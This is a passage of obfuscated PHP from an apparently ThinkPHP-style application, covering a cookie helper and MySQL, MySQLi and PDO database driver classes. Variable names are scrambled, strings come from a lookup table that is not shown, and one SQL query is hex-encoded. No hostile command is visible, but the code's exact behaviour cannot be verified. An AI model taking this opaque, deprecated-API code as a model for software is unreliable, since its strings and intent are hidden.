$_SERVER[ˆë€Ï⁄∂][12]) { $this->prefix = $∑Õ≥ëÎŸ; } if (is_numeric($±É⁄£¸ñ) && $±É⁄£¸ñ > 0) { $this->expire = $±É⁄£¸ñ; } } public static function getInstance() { static $ÔÄñ∫êÙ; if ($ÔÄñ∫êÙ === null) { $ÔÄñ∫êÙ = new self(); } return $ÔÄñ∫êÙ; } private static $cookieDisable = false; public static function disable($«≤—≤Ïø) { self::$cookieDisable = $«≤—≤Ïø; } private static $sameCookieSet = array(); public static function set($ù……ºŒá, $ÌπÎ Ë¡, $â÷†∏–◊ = 0, $‰⁄€ØÇã = false, $Ëﬁ∞¡†È = false) { $€…Ü¿Ã =& $_SERVER[ˆë€Ï⁄∂]; if (self::$cookieDisable) { return; } if (!$â÷†∏–◊) { $â÷†∏–◊ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$ù……ºŒá]) && self::$sameCookieSet[$ù……ºŒá] == $ÌπÎ Ë¡ . $â÷†∏–◊) { return; } self::$sameCookieSet[$ù……ºŒá] = $ÌπÎ Ë¡ . $â÷†∏–◊; if (!$Ëﬁ∞¡†È) { $Ëﬁ∞¡†È = str_replace(HOST, $€…Ü¿Ã[12], APP_HOST); $Ëﬁ∞¡†È = _get($GLOBALS, $€…Ü¿Ã[975], $Ëﬁ∞¡†È); } $∑ÔÅËÈî = $€…Ü¿Ã[12]; setcookie($ù……ºŒá, $ÌπÎ Ë¡, time() + $â÷†∏–◊, $€…Ü¿Ã[8] . trim($Ëﬁ∞¡†È, $€…Ü¿Ã[8]) . $∑ÔÅËÈî, !1, !1, $‰⁄€ØÇã); } public static function setSafe($ …æºƒæ, $ö‚˘Ä¿Æ, $ÀàÓ¿Ëª = 0) { self::set($ …æºƒæ, $ö‚˘Ä¿Æ, $ÀàÓ¿Ëª, !0); } public static function get($∂À≤ûÿô) { static $ÖﬂÇÁ©æ = false; if (!$ÖﬂÇÁ©æ) { self::initHeaderCookie(); $ÖﬂÇÁ©æ = !0; } return isset($_COOKIE[$∂À≤ûÿô]) ? $_COOKIE[$∂À≤ûÿô] : !1; } private static function initHeaderCookie() { $»íéﬂÆ¯ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($_SERVER[$»íéﬂÆ¯[976]]) || !$_SERVER[$»íéﬂÆ¯[976]]) { return; } $òΩ±Í“Á = explode($»íéﬂÆ¯[84], $_SERVER[$»íéﬂÆ¯[976]]); foreach ($òΩ±Í“Á as $∏º˝»≈Ö) { $∏º˝»≈Ö = explode($»íéﬂÆ¯[517], $∏º˝»≈Ö); if (count($∏º˝»≈Ö) != 2 || !isset($∏º˝»≈Ö[1])) { continue; } $_COOKIE[trim($∏º˝»≈Ö[0])] = trim($∏º˝»≈Ö[1]); } } public static function remove($Ëä¥ÁúÈ, $®‘ó…ÆÄ = false) { unset($_COOKIE[$Ëä¥ÁúÈ]); self::set($Ëä¥ÁúÈ, $_SERVER[ˆë€Ï⁄∂][12], 1, $®‘ó…ÆÄ); } } class DbMysql extends Db { public function __construct($Ï°â∂Ú = '') { $Éç§®·• =& $_SERVER[ˆë€Ï⁄∂]; if (!extension_loaded($Éç§®·•[896])) { think_exception(think_lang($Éç§®·•[14]) . $Éç§®·•[977]); } if (!empty($Ï°â∂Ú)) { $this->config = $Ï°â∂Ú; if (empty($this->config[$Éç§®·•[17]])) { $this->config[$Éç§®·•[17]] = $Éç§®·•[12]; } } } public function connect($´·ú∏ø = '', $˛â•÷ıÀ = 0, $óªÎÕõ® = false) { $£Æ∑Çõ· =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->linkID[$˛â•÷ıÀ])) { if (empty($´·ú∏ø)) { $´·ú∏ø = $this->config; } $‹∂ú≈≤Ï = $´·ú∏ø[$£Æ∑Çõ·[978]] . ($´·ú∏ø[$£Æ∑Çõ·[979]] ? "\x3a{$´·ú∏ø[$£Æ∑Çõ·[979]]}" : $£Æ∑Çõ·[12]); $é‹›ÿ£ü = !empty($´·ú∏ø[$£Æ∑Çõ·[17]][$£Æ∑Çõ·[18]]) ? $´·ú∏ø[$£Æ∑Çõ·[17]][$£Æ∑Çõ·[18]] : $this->pconnect; if ($é‹›ÿ£ü) { $this->linkID[$˛â•÷ıÀ] = mysql_pconnect($‹∂ú≈≤Ï, $´·ú∏ø[$£Æ∑Çõ·[980]], $´·ú∏ø[$£Æ∑Çõ·[981]], 131072); } else { $this->linkID[$˛â•÷ıÀ] = mysql_connect($‹∂ú≈≤Ï, $´·ú∏ø[$£Æ∑Çõ·[980]], $´·ú∏ø[$£Æ∑Çõ·[981]], !0, 131072); } if (!$this->linkID[$˛â•÷ıÀ] || !empty($´·ú∏ø[$£Æ∑Çõ·[21]]) && !mysql_select_db($´·ú∏ø[$£Æ∑Çõ·[21]], $this->linkID[$˛â•÷ıÀ])) { think_exception(mysql_error()); } $∏Ó’ôÅ• = mysql_get_server_info($this->linkID[$˛â•÷ıÀ]); mysql_query($£Æ∑Çõ·[982] . think_config($£Æ∑Çõ·[983]) . $£Æ∑Çõ·[68], $this->linkID[$˛â•÷ıÀ]); if ($∏Ó’ôÅ• > $£Æ∑Çõ·[984]) { mysql_query($£Æ∑Çõ·[985], $this->linkID[$˛â•÷ıÀ]); } $this->connected = !0; if (1 != think_config($£Æ∑Çõ·[22])) { unset($this->config); } } return $this->linkID[$˛â•÷ıÀ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($∂ˆÉ¸£¬) { $ÌÎõ÷ ‘ =& $_SERVER[ˆë€Ï⁄∂]; if (0 === stripos($∂ˆÉ¸£¬, $ÌÎõ÷ ‘[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $∂ˆÉ¸£¬; if ($this->queryID) { $this->free(); } think_action_status($ÌÎõ÷ ‘[23], 1); think_status($ÌÎõ÷ ‘[24]); $this->queryID = mysql_query($∂ˆÉ¸£¬, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($çëõ¿ùÂ) { $‚¸˘‰≈¸ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $çëõ¿ùÂ; if ($this->queryID) { $this->free(); } think_action_status($‚¸˘‰≈¸[25], 1); think_status($‚¸˘‰≈¸[24]); $•ÿ„ìè¸ = mysql_query($çëõ¿ùÂ, $this->_linkID); $this->debug(); if (!1 === $•ÿ„ìè¸) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ˆë€Ï⁄∂][986], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Û÷´πìÅ = mysql_query($_SERVER[ˆë€Ï⁄∂][987], $this->_linkID); $this->transTimes = 0; if (!$Û÷´πìÅ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Â„∂≈Ωß = mysql_query($_SERVER[ˆë€Ï⁄∂][988], $this->_linkID); $this->transTimes = 0; if (!$Â„∂≈Ωß) { $this->error(); return !1; } } return !0; } private function getAll() { $û–ÊÉéú = array(); if ($this->numRows > 0) { while ($∑‡®äãã = mysql_fetch_assoc($this->queryID)) { $û–ÊÉéú[] = $∑‡®äãã; } mysql_data_seek($this->queryID, 0); } return $û–ÊÉéú; } public function getFields($ºä¯÷ªé) { $Óôﬂ÷Ê’ =& $_SERVER[ˆë€Ï⁄∂]; $ ƒ©∆‰Ü = $this->query($Óôﬂ÷Ê’[989] . $this->parseKey($ºä¯÷ªé)); $Ó…ˆÅ’„ = array(); if ($ ƒ©∆‰Ü) { foreach ($ ƒ©∆‰Ü as $ïÆúŸô◊ => $Íäõ»⁄æ) { $Ó…ˆÅ’„[$Íäõ»⁄æ[$Óôﬂ÷Ê’[31]]] = array($Óôﬂ÷Ê’[32] => $Íäõ»⁄æ[$Óôﬂ÷Ê’[31]], $Óôﬂ÷Ê’[33] => $Íäõ»⁄æ[$Óôﬂ÷Ê’[34]], $Óôﬂ÷Ê’[35] => (bool) (strtoupper($Íäõ»⁄æ[$Óôﬂ÷Ê’[36]]) === $Óôﬂ÷Ê’[990]), $Óôﬂ÷Ê’[37] => $Íäõ»⁄æ[$Óôﬂ÷Ê’[38]], $Óôﬂ÷Ê’[39] => strtolower($Íäõ»⁄æ[$Óôﬂ÷Ê’[40]]) == $Óôﬂ÷Ê’[41], $Óôﬂ÷Ê’[42] => strtolower($Íäõ»⁄æ[$Óôﬂ÷Ê’[43]]) == $Óôﬂ÷Ê’[44]); } } return $Ó…ˆÅ’„; } public function getTables($´è®¥Í = '') { $óâä´ïÿ =& $_SERVER[ˆë€Ï⁄∂]; if (!empty($´è®¥Í)) { $»‡ã‚†≠ = $óâä´ïÿ[991] . $´è®¥Í . $óâä´ïÿ[992]; } else { $»‡ã‚†≠ = $óâä´ïÿ[993]; } $¨Îß†é” = $this->query($»‡ã‚†≠); $óı≤èãÌ = array(); foreach ($¨Îß†é” as $Ì‚ÇÔöí => $ÙÚû¢±ƒ) { $óı≤èãÌ[$Ì‚ÇÔöí] = current($ÙÚû¢±ƒ); } return $óı≤èãÌ; } public function replace($ƒÂ⁄¬¸≥, $«§πß£¢ = array()) { $éÙûÁ¢◊ =& $_SERVER[ˆë€Ï⁄∂]; foreach ($ƒÂ⁄¬¸≥ as $Ú€Ú∂í¶ => $´âáå®—) { $¬÷ÛΩÅ¡ = $this->parseValue($´âáå®—); if (is_scalar($¬÷ÛΩÅ¡)) { $Ùﬂ„ÕõÇ[] = $¬÷ÛΩÅ¡; $¥∆„˙ñ‘[] = $this->parseKey($Ú€Ú∂í¶); } } $ËîÛ°Ä∞ = $éÙûÁ¢◊[994] . $this->parseTable($«§πß£¢[$éÙûÁ¢◊[367]]) . $éÙûÁ¢◊[995] . implode($éÙûÁ¢◊[50], $¥∆„˙ñ‘) . $éÙûÁ¢◊[996] . implode($éÙûÁ¢◊[50], $Ùﬂ„ÕõÇ) . $éÙûÁ¢◊[997]; return $this->execute($ËîÛ°Ä∞); } public function insertAll($Ãì∑˝Û€, $¥˛∑úô≠ = array(), $èã°¸ÔÎ = false) { $∏˘œàÃÒ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($Ãì∑˝Û€[0])) { return !1; } $º˘Ó«Ã± = array_keys($Ãì∑˝Û€[0]); $ÖÍûÆ◊£ = array(); foreach ($Ãì∑˝Û€ as $Æãé¸≈È) { $¥ó«–˛Ë = array(); foreach ($Æãé¸≈È as $˜á¶àŸŸ => $ç∫£ıﬂö) { $ç∫£ıﬂö = $this->parseValue($ç∫£ıﬂö); if (is_scalar($ç∫£ıﬂö)) { $¥ó«–˛Ë[] = $ç∫£ıﬂö; } } $ÖÍûÆ◊£[] = $∏˘œàÃÒ[348] . implode($∏˘œàÃÒ[50], $¥ó«–˛Ë) . $∏˘œàÃÒ[997]; } array_walk($º˘Ó«Ã±, array($this, $∏˘œàÃÒ[998])); $£ø∑ë–Û = ($èã°¸ÔÎ ? $∏˘œàÃÒ[999] : $∏˘œàÃÒ[1000]) . $∏˘œàÃÒ[1001] . $this->parseTable($¥˛∑úô≠[$∏˘œàÃÒ[367]]) . $∏˘œàÃÒ[995] . implode($∏˘œàÃÒ[50], $º˘Ó«Ã±) . $∏˘œàÃÒ[1002] . implode($∏˘œàÃÒ[50], $ÖÍûÆ◊£); return $this->execute($£ø∑ë–Û); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $∆ﬁ‹äÛ£ =& $_SERVER[ˆë€Ï⁄∂]; $this->error = mysql_errno() . $∆ﬁ‹äÛ£[4] . mysql_error($this->_linkID); if ($∆ﬁ‹äÛ£[12] != $this->queryStr) { $this->error .= LNG($∆ﬁ‹äÛ£[48]) . $this->queryStr; } think_trace($this->error, $∆ﬁ‹äÛ£[12], $∆ﬁ‹äÛ£[49]); return $this->error; } public function escapeString($à‚˜˛Ñ≠) { if ($this->_linkID) { return mysql_real_escape_string($à‚˜˛Ñ≠, $this->_linkID); } else { return mysql_escape_string($à‚˜˛Ñ≠); } } public function parseKey(&$∫Ä∞∏∆¢, $Ò≠ËÌ“Ë = true) { $üµ≥‚πÎ =& $_SERVER[ˆë€Ï⁄∂]; if ($Ò≠ËÌ“Ë) { $∫Ä∞∏∆¢ = $this->parseKeyCheck($∫Ä∞∏∆¢); } if ($∫Ä∞∏∆¢ != $üµ≥‚πÎ[232] && !preg_match($üµ≥‚πÎ[1003], $∫Ä∞∏∆¢)) { $∫Ä∞∏∆¢ = $üµ≥‚πÎ[472] . trim($∫Ä∞∏∆¢, $üµ≥‚πÎ[472]) . $üµ≥‚πÎ[472]; } return $∫Ä∞∏∆¢; } } goto Bç∆Ï¥•“§; Bç∆Ï¥•“§: class DbMysqli extends Db { public function __construct($œ∂ŒÀÈ¶ = '') { $ó€ﬁ˚ñ† =& $_SERVER[ˆë€Ï⁄∂]; if (!extension_loaded($ó€ﬁ˚ñ†[1004])) { think_exception(think_lang($ó€ﬁ˚ñ†[14]) . $ó€ﬁ˚ñ†[1005]); } if (!empty($œ∂ŒÀÈ¶)) { $this->config = $œ∂ŒÀÈ¶; if (empty($this->config[$ó€ﬁ˚ñ†[17]])) { $this->config[$ó€ﬁ˚ñ†[17]] = $ó€ﬁ˚ñ†[12]; } } } public function connect($ÔÉú∑˘ﬂ = '', $Ïó™Ñ¡ø = 0) { $ÌÍ«û∞∏ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->linkID[$Ïó™Ñ¡ø])) { if (empty($ÔÉú∑˘ﬂ)) { $ÔÉú∑˘ﬂ = $this->config; } $this->linkID[$Ïó™Ñ¡ø] = new mysqli($ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[978]], $ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[980]], $ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[981]], $ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[21]], $ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[979]] ? intval($ÔÉú∑˘ﬂ[$ÌÍ«û∞∏[979]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ü«ÕŸ‡Ê = $this->linkID[$Ïó™Ñ¡ø]->server_version; $this->linkID[$Ïó™Ñ¡ø]->query($ÌÍ«û∞∏[982] . think_config($ÌÍ«û∞∏[983]) . $ÌÍ«û∞∏[68]); if ($ü«ÕŸ‡Ê > $ÌÍ«û∞∏[984]) { $this->linkID[$Ïó™Ñ¡ø]->query($ÌÍ«û∞∏[985]); } $this->connected = !0; if (1 != think_config($ÌÍ«û∞∏[22])) { unset($this->config); } } return $this->linkID[$Ïó™Ñ¡ø]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($—îÇçÇ”) { $Å∞Á™Æ¶ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $—îÇçÇ”; if ($this->queryID) { $this->free(); } think_action_status($Å∞Á™Æ¶[23], 1); think_status($Å∞Á™Æ¶[24]); $this->queryID = $this->_linkID->query($—îÇçÇ”); if ($this->_linkID->more_results()) { while (($·™˜¯⁄è = $this->_linkID->next_result()) != NULL) { $·™˜¯⁄è->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Å≠•‚´Ë) { $÷øﬁáÈó =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Å≠•‚´Ë; if ($this->queryID) { $this->free(); } think_action_status($÷øﬁáÈó[25], 1); think_status($÷øﬁáÈó[24]); $æÔ–ãî  = $this->_linkID->query($Å≠•‚´Ë); $this->debug(); if (!1 === $æÔ–ãî ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $—ï∫£„‡ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$—ï∫£„‡) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‰ÓÃî ç = $this->_linkID->rollback(); $this->transTimes = 0; if (!$‰ÓÃî ç) { $this->error(); return !1; } } return !0; } private function getAll() { $¿˛§ÉÖ± = array(); if ($this->numRows > 0) { for ($ÕŒÀÇÒº = 0; $ÕŒÀÇÒº < $this->numRows; $ÕŒÀÇÒº++) { $¿˛§ÉÖ±[$ÕŒÀÇÒº] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $¿˛§ÉÖ±; } public function getFields($Ì∫ˆ›Â±) { $ú¥ó·Ò£ =& $_SERVER[ˆë€Ï⁄∂]; $Â†ƒæ÷¯ = $this->query($ú¥ó·Ò£[989] . $this->parseKey($Ì∫ˆ›Â±)); $⁄Í◊˙Ωó = array(); if ($Â†ƒæ÷¯) { foreach ($Â†ƒæ÷¯ as $Î◊ıÛ◊Õ => $˙∑òè©ø) { $⁄Í◊˙Ωó[$˙∑òè©ø[$ú¥ó·Ò£[31]]] = array($ú¥ó·Ò£[32] => $˙∑òè©ø[$ú¥ó·Ò£[31]], $ú¥ó·Ò£[33] => $˙∑òè©ø[$ú¥ó·Ò£[34]], $ú¥ó·Ò£[35] => (bool) ($˙∑òè©ø[$ú¥ó·Ò£[36]] === $ú¥ó·Ò£[12]), $ú¥ó·Ò£[37] => $˙∑òè©ø[$ú¥ó·Ò£[38]], $ú¥ó·Ò£[39] => strtolower($˙∑òè©ø[$ú¥ó·Ò£[40]]) == $ú¥ó·Ò£[41], $ú¥ó·Ò£[42] => strtolower($˙∑òè©ø[$ú¥ó·Ò£[43]]) == $ú¥ó·Ò£[44]); } } return $⁄Í◊˙Ωó; } public function getTables($˙ª±ûÎÑ = '') { $Ωêü±ñÛ =& $_SERVER[ˆë€Ï⁄∂]; $“¸æÔ—⁄ = !empty($˙ª±ûÎÑ) ? $Ωêü±ñÛ[991] . $˙ª±ûÎÑ . $Ωêü±ñÛ[992] : $Ωêü±ñÛ[993]; $¿ï„øµÏ = $this->query($“¸æÔ—⁄); $ÓÄä»’¶ = array(); if ($¿ï„øµÏ) { foreach ($¿ï„øµÏ as $Ö„‘∆öÒ => $¨Ûô›…Ú) { $ÓÄä»’¶[$Ö„‘∆öÒ] = current($¨Ûô›…Ú); } } return $ÓÄä»’¶; } public function replace($¶åàëÉ„, $§å‰Æ¢ê = array()) { $À’â—óû =& $_SERVER[ˆë€Ï⁄∂]; foreach ($¶åàëÉ„ as $€Ñ”ÔÈ€ => $‹ﬂóÚΩ‚) { $ƒ£¸Âå… = $this->parseValue($‹ﬂóÚΩ‚); if (is_scalar($ƒ£¸Âå…)) { $¨ﬁ—À› [] = $ƒ£¸Âå…; $÷π„£≈ß[] = $this->parseKey($€Ñ”ÔÈ€); } } $ÒØ·íõ‰ = $À’â—óû[994] . $this->parseTable($§å‰Æ¢ê[$À’â—óû[367]]) . $À’â—óû[995] . implode($À’â—óû[50], $÷π„£≈ß) . $À’â—óû[996] . implode($À’â—óû[50], $¨ﬁ—À› ) . $À’â—óû[997]; return $this->execute($ÒØ·íõ‰); } public function insertAll($˙π˝ü·ò, $‰®∏‰ñç = array(), $Ê…ÑÇ‡¶ = false) { $‘ÒÀ‡π≥ =& $_SERVER[ˆë€Ï⁄∂]; if (!is_array($˙π˝ü·ò[0])) { return !1; } $∂Õ‰ü†¿ = array_keys($˙π˝ü·ò[0]); $ á¸ ÇÒ = array(); foreach ($˙π˝ü·ò as $ãû◊¬—“) { $∞Î¥˜ó› = array(); foreach ($ãû◊¬—“ as $ñˆ˛è‹“ => $∑ ˛Ééÿ) { $∑ ˛Ééÿ = $this->parseValue($∑ ˛Ééÿ); if (is_scalar($∑ ˛Ééÿ)) { $∞Î¥˜ó›[] = $∑ ˛Ééÿ; } } $ á¸ ÇÒ[] = $‘ÒÀ‡π≥[348] . implode($‘ÒÀ‡π≥[50], $∞Î¥˜ó›) . $‘ÒÀ‡π≥[997]; } array_walk($∂Õ‰ü†¿, array($this, $‘ÒÀ‡π≥[998])); $ÒÂÑ¬˘˚ = $Ê…ÑÇ‡¶ ? $‘ÒÀ‡π≥[999] : $‘ÒÀ‡π≥[1000]; $…öì´¨“ = $ÒÂÑ¬˘˚ . $‘ÒÀ‡π≥[1001] . $this->parseTable($‰®∏‰ñç[$‘ÒÀ‡π≥[367]]) . $‘ÒÀ‡π≥[995] . implode($‘ÒÀ‡π≥[50], $∂Õ‰ü†¿) . $‘ÒÀ‡π≥[1002] . implode($‘ÒÀ‡π≥[50], $ á¸ ÇÒ); return $this->execute($…öì´¨“); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¶„Íﬁ§È =& $_SERVER[ˆë€Ï⁄∂]; $this->error = $this->_linkID->errno . $¶„Íﬁ§È[4] . $this->_linkID->error; if ($¶„Íﬁ§È[12] != $this->queryStr) { $this->error .= LNG($¶„Íﬁ§È[48]) . $this->queryStr; } think_trace($this->error, $¶„Íﬁ§È[12], $¶„Íﬁ§È[49]); return $this->error; } public function escapeString($€Õ≈˚¸ç) { if ($this->_linkID) { return $this->_linkID->real_escape_string($€Õ≈˚¸ç); } else { return addslashes($€Õ≈˚¸ç); } } public function parseKey(&$ÀÏ‰›≈, $õ˙¯ù» = true) { $µ˛õ’¥í =& $_SERVER[ˆë€Ï⁄∂]; if ($õ˙¯ù») { $ÀÏ‰›≈ = $this->parseKeyCheck($ÀÏ‰›≈); } if ($ÀÏ‰›≈ != $µ˛õ’¥í[232] && !preg_match($µ˛õ’¥í[1003], $ÀÏ‰›≈)) { $ÀÏ‰›≈ = $µ˛õ’¥í[472] . trim($ÀÏ‰›≈, $µ˛õ’¥í[472]) . $µ˛õ’¥í[472]; } return $ÀÏ‰›≈; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($ñµ÷∑“∆ = '') { $”Ö∫Úù¿ =& $_SERVER[ˆë€Ï⁄∂]; if (!class_exists($”Ö∫Úù¿[1006])) { think_exception(think_lang($”Ö∫Úù¿[14]) . $”Ö∫Úù¿[1007]); } if (!empty($ñµ÷∑“∆)) { $this->config = $ñµ÷∑“∆; if (empty($this->config[$”Ö∫Úù¿[17]])) { $this->config[$”Ö∫Úù¿[17]] = array(); } } } public function connect($ΩÍÁßß¥ = '', $ÁØøÓÏΩ = 0) { $Å‹Öß¬∑ =& $_SERVER[ˆë€Ï⁄∂]; if (!isset($this->linkID[$ÁØøÓÏΩ])) { if (empty($ΩÍÁßß¥)) { $ΩÍÁßß¥ = $this->config; } $åÉ≥Î∫Û = !empty($ΩÍÁßß¥[$Å‹Öß¬∑[17]][$Å‹Öß¬∑[18]]) ? $ΩÍÁßß¥[$Å‹Öß¬∑[17]][$Å‹Öß¬∑[18]] : $this->pconnect; if ($åÉ≥Î∫Û) { $ΩÍÁßß¥[$Å‹Öß¬∑[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÁØøÓÏΩ] = new PDO($ΩÍÁßß¥[$Å‹Öß¬∑[1008]], $ΩÍÁßß¥[$Å‹Öß¬∑[980]], $ΩÍÁßß¥[$Å‹Öß¬∑[981]], $ΩÍÁßß¥[$Å‹Öß¬∑[17]]); } catch (PDOException $áπ€”§) { think_exception($áπ€”§->getMessage()); } $this->dbType = $this->_getDsnType($ΩÍÁßß¥[$Å‹Öß¬∑[1008]]); if (in_array($this->dbType, array($Å‹Öß¬∑[1009], $Å‹Öß¬∑[1010], $Å‹Öß¬∑[1011], $Å‹Öß¬∑[1012]))) { think_exception($Å‹Öß¬∑[1013] . $this->dbType . $Å‹Öß¬∑[1014] . $this->dbType . $Å‹Öß¬∑[1015]); } if (!$this->linkID[$ÁØøÓÏΩ]) { think_exception($Å‹Öß¬∑[1016]); } try { $this->linkID[$ÁØøÓÏΩ]->exec($Å‹Öß¬∑[1017] . think_config($Å‹Öß¬∑[983])); } catch (Exception $áπ€”§) { } $this->connected = !0; if (1 != think_config($Å‹Öß¬∑[22])) { unset($this->config); } } return $this->linkID[$ÁØøÓÏΩ]; } public function free() { $this->PDOStatement = null; } public function query($≠˘Ñô¨‹, $∫£ëÅÉ÷ = array()) { $å‰õâÙ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $≠˘Ñô¨‹; if (!empty($∫£ëÅÉ÷)) { $this->queryStr .= $å‰õâÙ[1018] . print_r($∫£ëÅÉ÷, !0) . $å‰õâÙ[1019]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($å‰õâÙ[23], 1); think_status($å‰õâÙ[24]); $this->PDOStatement = $this->_linkID->prepare($≠˘Ñô¨‹); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ë‹‚â·’ = $this->PDOStatement->execute($∫£ëÅÉ÷); $this->debug(); if (!1 === $ë‹‚â·’) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¢ØŒﬂ∑∆, $õæ†óﬂé = array()) { $Ï—⁄ºù =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¢ØŒﬂ∑∆; if (!empty($õæ†óﬂé)) { $this->queryStr .= $Ï—⁄ºù[1018] . print_r($õæ†óﬂé, !0) . $Ï—⁄ºù[1019]; } $ö¯ó¸´¥ = !1; if ($this->dbType == $Ï—⁄ºù[1012]) { if (preg_match($Ï—⁄ºù[1020], $this->queryStr, $‰”˜Äúê)) { $this->table = think_config($Ï—⁄ºù[1021]) . str_ireplace(think_config($Ï—⁄ºù[1022]), $Ï—⁄ºù[465], $‰”˜Äúê[2]); $ö¯ó¸´¥ = (bool) $this->query($Ï—⁄ºù[1023] . strtoupper($this->table) . $Ï—⁄ºù[68]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ï—⁄ºù[25], 1); think_status($Ï—⁄ºù[24]); $this->PDOStatement = $this->_linkID->prepare($¢ØŒﬂ∑∆); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $≈Ëª•Ò† = $this->PDOStatement->execute($õæ†óﬂé); $this->debug(); if (!1 === $≈Ëª•Ò†) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ö¯ó¸´¥ || preg_match($Ï—⁄ºù[1024], $¢ØŒﬂ∑∆)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $§ΩıÅ˚à = $this->_linkID->commit(); $this->transTimes = 0; if (!$§ΩıÅ˚à) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Êæ“äËø = $this->_linkID->rollback(); $this->transTimes = 0; if (!$Êæ“äËø) { $this->error(); return !1; } } return !0; } private function getAll() { $‚éêüÛœ = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($‚éêüÛœ); return $‚éêüÛœ; } public function getFields($¬¸ìﬁÙ¶) { $â∞”˙≈ﬁ =& $_SERVER[ˆë€Ï⁄∂]; $this->initConnect(!0); if (think_config($â∞”˙≈ﬁ[1025])) { $öà™©„∆ = str_replace($â∞”˙≈ﬁ[1026], $¬¸ìﬁÙ¶, think_config($â∞”˙≈ﬁ[1025])); } else { switch ($this->dbType) { case $â∞”˙≈ﬁ[1009]: case $â∞”˙≈ﬁ[1027]: $öà™©„∆ = "\x53\x45\114\x45\103\x54\40\40\x20\143\157\154\165\x6d\x6e\x5f\x6e\x61\155\x65\40\141\163\x20\x27\x4e\141\155\145\47\54\40\x20\x20\144\x61\164\x61\137\x74\171\160\x65\40\x61\x73\40\47\x54\171\160\145\x27\x2c\x20\x20\40\143\x6f\154\165\x6d\156\137\144\x65\x66\141\165\154\x74\x20\x61\163\x20\47\104\x65\146\x61\165\154\164\47\x2c\x20\40\40\151\x73\x5f\x6e\165\x6c\154\x61\142\154\145\40\x61\x73\40\x27\x4e\x75\x6c\154\47\12\x9\x9\x46\122\x4f\x4d\x9\151\x6e\x66\x6f\162\x6d\141\x74\151\x6f\156\x5f\163\x63\150\145\x6d\141\56\x74\x61\142\154\x65\x73\40\101\x53\x20\x74\xa\11\11\x4a\x4f\111\116\x9\x69\x6e\146\x6f\x72\x6d\x61\164\151\x6f\156\x5f\x73\x63\150\x65\x6d\141\56\143\157\154\x75\x6d\x6e\x73\40\101\x53\x20\x63\12\11\x9\117\116\40\x20\164\56\164\x61\x62\154\x65\137\x63\x61\x74\x61\x6c\x6f\x67\x20\75\x20\143\56\164\141\x62\x6c\x65\137\x63\141\164\141\x6c\157\x67\12\x9\11\101\116\104\40\164\56\x74\x61\142\154\145\137\163\143\x68\145\155\141\40\75\40\143\56\x74\141\142\x6c\x65\137\x73\143\150\145\x6d\141\12\11\11\x41\x4e\x44\x20\x74\56\164\x61\142\x6c\x65\x5f\x6e\x61\x6d\145\x20\x3d\40\143\56\x74\141\x62\154\x65\137\x6e\x61\x6d\145\12\x9\11\127\110\x45\122\105\x20\40\x20\x74\56\x74\x61\142\154\145\x5f\x6e\x61\155\x65\x20\x3d\40\x27{